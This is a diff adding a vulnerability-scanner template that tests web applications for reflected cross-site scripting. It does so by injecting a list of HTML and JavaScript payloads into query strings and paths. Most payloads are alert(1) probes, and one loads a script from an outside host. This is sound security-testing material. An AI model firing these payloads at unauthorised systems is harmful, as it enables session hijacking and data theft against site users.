@@ -1,0 +1,93 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<html id=x tabindex=1 ondeactivate=alert(1)></html><input id=y autofocus>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><source ondragover=alert(1) contenteditable>drop here</source>"
+        - "<tt onmouseenter=\"alert(1)\">test</tt>"
+        - "<IMG SRC=x onmouseover=\"alert(String.fromCharCode(88,83,83))\">"
+        - "<mark draggable=\"true\" ondragleave=\"alert(1)\">test</mark>"
+        - "<ul draggable=\"true\" ondragenter=\"alert(1)\">test</ul>"
+        - "<input type=\"text\">"
+        - "<iframe draggable=\"true\" ondragend=\"alert(1)\">test</iframe>"
+        - "<aside draggable=\"true\" ondragleave=\"alert(1)\">test</aside>"
+        - "<style>:target {color:red;}</style><dialog id=x style=\"transition:color 1s\" ontransitioncancel=alert(1)></dialog>"
+        - "<svg><title onclick=\"alert(1)\">test</title></svg>"
+        - "<html draggable=\"true\" ondragleave=\"alert(1)\">test</html>"
+        - "<style>@keyframes slidein {}</style><kbd style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></kbd>"
+        - "<svg/onerror=\"javascript:javascript:alert(1)\"></svg/onerror>"
+        - "<svg id=x tabindex=1 onbeforedeactivate=alert(1)></svg><input autofocus>"
+        - "<tr onpaste=\"alert(1)\" contenteditable>test</tr>"
+        - "<time id=x tabindex=1 ondeactivate=alert(1)></time><input id=y autofocus>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><time ondrop=alert(1) contenteditable>drop here</time>"
+        - "<basefont onclick=\"alert(1)\">test</basefont>"
+        - "<output draggable=\"true\" ondragleave=\"alert(1)\">test</output>"
+        - "<plaintext id=x tabindex=1 onactivate=alert(1)></plaintext><input autofocus>"
+        - "<sub id=x tabindex=1 ondeactivate=alert(1)></sub><input autofocus>"
+        - "<del draggable=\"true\" ondragleave=\"alert(1)\">test</del>"
+        - "<embed src=\"javascript:alert(1)\"></embed>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tfoot id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></tfoot>"
+        - "<IMG SRC=x onmouseenter=\"alert(1)\">"
+        - "<script src=\"//ha.ckers.org/cross.js\" type=\"text/javascript\"></script><img id=x style=\"xss:expression(alert('XSS'))\">"
+        - "<body id=x tabindex=1 onfocus=alert(1)></body><input autofocus>"
+        - "<plaintext draggable=\"true\" ondragleave=\"alert(1)\">test</plaintext>"
+        - "<script>alert('XSS');</script>"
+        - "<nobr onclick=\"alert(1)\">test</nobr>"
+        - "<IMG SRC=x onbeforecut=\"alert(String.fromCharCode(88,83,83))\">"
+        - "<svg draggable=\"true\" ondragend=\"alert(1)\">test</svg>"
+        - "<menu draggable=\"true\" ondragend=\"alert(1)\">test</menu>"
+        - "<output id=x tabindex=1 ondeactivate=alert(1)></output><input autofocus>"
+        - "<audio autoplay controls><source src=\"validaudio.wav\" type=\"audio/wav\">"
+        - "<embed src=\"&#100;&#107;&#110;&#108;\">"
+        - "<legend onkeypress=\"alert(1)\" contenteditable>test</legend>"
+        - "<ul id=x tabindex=1 ondeactivate=alert(1)></ul><input autofocus>"
+        - "<details draggable=\"true\" ondragleave=\"alert(1)\">test</details>"
+        - "<style>@keyframes x{}</style><input style=\"animation-name:x\" onanimationend=\"alert(1)\"></input>"
+        - "<output draggable=\"true\" ondragend=\"alert(1)\">test</output>"
+        - "<style>@keyframes x{}</style><input style=\"animation-name:x\" onanimationstart=\"alert(1)\"></input>"
+        - "<output id=x tabindex=1 ondeactivate=alert(1)></output><input id=y autofocus>"
+        - "<style>@keyframes slidein {}</style><progress style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></progress>"
+        - "<bdi oncontextmenu=\"alert(1)\">test</bdi>"
+        - "<del id=x tabindex=1 onfocusin=alert(1)></del>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
